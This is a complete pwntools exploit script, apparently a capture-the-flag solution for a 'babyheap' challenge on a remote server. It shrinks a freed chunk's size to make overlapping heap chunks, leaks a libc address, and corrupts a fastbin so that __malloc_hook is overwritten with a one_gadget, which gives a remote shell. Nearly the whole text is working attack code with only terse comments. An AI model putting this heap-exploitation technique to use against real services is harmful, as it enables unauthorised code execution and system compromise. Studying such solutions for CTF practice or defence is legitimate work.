from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'x86_64'

libc = ELF('./libc.so.6_b86ec517ee44b2d6c03096e0518c72a1')
libc.symbols['one_gadget'] = 0x41374
bin_offset = 0x3a5678

def allocate(size):
    print r.recvuntil('Command: ')
    r.sendline('1')
    print r.recvuntil('Size: ')
    r.sendline(str(size))

def fill(index, content):
    print r.recvuntil('Command: ')
    r.sendline('2')
    print r.recvuntil('Index: ')
    r.sendline(str(index))
    print r.recvuntil('Size: ')
    r.sendline(str(len(content)))
    print r.recvuntil('Content: ')
    r.send(content)

def free(index):
    print r.recvuntil('Command: ')
    r.sendline('3')
    print r.recvuntil('Index: ')
    r.sendline(str(index))

def dump(index):
    print r.recvuntil('Command: ')
    r.sendline('4')
    print r.recvuntil('Index: ')
    r.sendline(str(index))
    print r.recvuntil('Content: \n')
    data = r.recvline()
    print data
    return data


# r = process(
    # './babyheap_69a42acd160ab67a68047ca3f9c390b9',
    # env={ 'LD_PRELOAD': './libc.so.6_b86ec517ee44b2d6c03096e0518c72a1' }
# )
# gdb.attach(r, '''
# c
# ''')
r = remote('202.120.7.218', 2017)

# create overlapping chunks by shrinking a free chunk's size
allocate(16) #0
allocate(480) #1
allocate(512) #2
allocate(512) #3
free(1)
fill(0, flat('A'*24, '\x30')) # shrink the chunk
allocate(128) #1
allocate(96) #4
free(1)
free(2)

# overlap the header of the remainder chunk with the forgetten chunk to
# leak the address of libc
allocate(128) #1
data = dump(4)
bin_address = u64(data[:8])
log.critical(hex(bin_address))
libc.address = bin_address - bin_offset
log.critical(hex(libc.address))

# fastbin corruption
# get a chunk just before __malloc_hook in the second allocation
fill(1, flat('B'*0x80, 0x90, 0x70)) # fix chunk meta data
free(4)
fill(1, flat('B'*0x80, 0x90, 0x70, libc.symbols['__malloc_hook']-0x23)) # override fd
allocate(96) #2
allocate(96) #4
fill(4, flat('\x00'*19, libc.symbols['one_gadget']))

# trigger __malloc_hook
allocate(96)

r.interactive()
